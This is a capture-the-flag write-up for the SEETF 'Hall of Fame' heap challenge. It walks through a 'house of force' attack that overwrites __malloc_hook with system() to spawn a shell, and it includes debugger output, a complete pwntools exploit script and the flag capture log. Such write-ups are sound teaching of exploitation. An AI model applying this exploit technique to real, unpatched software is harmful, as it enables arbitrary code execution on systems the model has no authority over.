
# Hall of Fame

## Challenge

- [hall_of_fame](hall_of_fame)
- [hall_of_fame_patched](hall_of_fame_patched) * patched with [pwninint](https://github.com/io12/pwninit)

## Solution

The binary suffers from a vulnerability that can be exploited via the ``house of force`` technique. 

```
pwndbg> vis_heap_chunks
0xfc0250        0x0000000000000000      0x0000000000000021      ........!.......
0xfc0260        0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
0xfc0270        0x6161616161616161      0xfffffffffffffff1      aaaaaaaa.......
```

We noticed that sending in 0x16 "a"s + p64(0xfffffffffffffff1) allows us to overwrite the top chunk's size field.

```python
info("Setting Top Chunk Size == 0xfffffffffffffff1 ")
malloc(16, b'a' * 24 + p64(0xfffffffffffffff1))
```

We confirm this by running the ``pwndbg`` plugin ``top_chunk``, which shows the new ``Size: 0xfffffffffffffff1``

```
pwndbg> top_chunk 
Top chunk
Addr: 0xfc0270
Size: 0xfffffffffffffff1
```

Next, we need to set the top chunk address to 0x10 bytes before the ``__mallock_hook``.

```python
info("Setting Top Chunk Addr = __mallock_hook - 0x10")
malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x20 - 0x10 
malloc(distance, b"Y")
```

We confirm in GDB that we've reached this by checking the ``top_chunk Addr`` and noticed that it is 0x10 bytes before the ``__malloc_hook``

```
pwndbg> top_chunk 
Top chunk
Addr: 0x7fcd33e8dc20
Size: 0xffff80e12d69d641

pwndbg> x/10i 0x7fcd33e8dc20+0x10
...
0x7fcd33e8dc30 <__malloc_hook>:      add    BYTE PTR [rax],al
```

Finally, we will overwrite the ``__malloc_hook`` address with the address of glibc ``system()`` call.

```python
info("overwriting __malloc_hook with libc.sym.system")
malloc(24, p64(libc.sym.system))
```

Checking the address of system, we see it is at ``0x7fcd33af1420``. Further, checking the ``__malloc_hook``, we see we have overwritten it with the address of ``system``.

```
pwndbg> dq &__libc_system 
00007fcd33af1420     fa66e90b74ff8548 0000441f0f66ffff

pwndbg> dq &__malloc_hook
00007fcd33e8dc30     00007fcd33af1420 616161616161000a
```

We can finalize the exploit by calling ``malloc("/bin/sh",'')``, which now calls ``system("/bin/sh")`` instead.

```
info("Calling malloc(\"/bin/sh\"), which is now system(\"/bin/sh\")")
malloc(next(libc.search(b"/bin/sh")), b"")
```

Our final script is 

```python
from pwn import *

binary=args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = ELF(e.runpath + b"/libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('fun.chall.seetf.sg', '50004')
    else:
        return process(e.path)

p = start()

def malloc(sz,data):
   p.recvuntil(b'Choose>')
   p.sendline(b'1')
   p.recvuntil(b'How many points did this person score? >')
   p.sendline(b"%i" %sz)
   p.sendline(data)

def leak():
   p.recvuntil(b'Choose>')
   p.sendline(b'2')
   p.recvuntil(b'The position of latest addition is at ')
   heap=int(p.recvline().strip(b'\n'),16)
   info("Heap = %s" %hex(heap))
   p.recvuntil(b'The position of PUTS is at ')
   libc.address=int(p.recvline().strip(b'\n'),16)-libc.sym['puts']
   info("Libc = %s" %hex(libc.address))
   return heap


info("Setting Top Chunk Size == 0xfffffffffffffff1 ")
malloc(16, b'a' * 24 + p64(0xfffffffffffffff1))

info("Leaking Heap, Libc.Address")
heap=leak()

info("Setting Top Chunk Addr = __mallock_hook - 0x10")
malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x20 - 0x10 
malloc(distance, b"Y")

info("overwriting __malloc_hook with libc.sym.system")
malloc(24, p64(libc.sym.system))

info("Calling malloc(\"/bin/sh\"), which is now system(\"/bin/sh\")")
malloc(next(libc.search(b"/bin/sh")), b"")

p.interactive()

```


Running this yields the flag

```
└─# python3 pwn-hof.py BIN=./hall_of_fame_patched REMOTE
[*] '/root/workspace/pwn_hall_of_fame/hall_of_fame_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
[*] b'/root/workspace/pwn_hall_of_fame/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to fun.chall.seetf.sg on port 50004: Done
[*] Setting Top Chunk Size == 0xfffffffffffffff1 
[*] Leaking Heap, Libc.Address
[*] Heap = 0x13b0260
[*] Libc = 0x7f14e456d000
[*] Setting Top Chunk Addr = __mallock_hook - 0x10
[*] overwriting __malloc_hook with libc.sym.system
[*] Calling malloc("/bin/sh"), which is now system("/bin/sh")
[*] Switching to interactive mode

$ cat /home/hall_of_famer/flag.txt
SEE{W3lc0mE_t0_th3_H4lL_0f_F4ME_0de280c6adb0f3da9f7ee5bd2057f8354969920c}
```	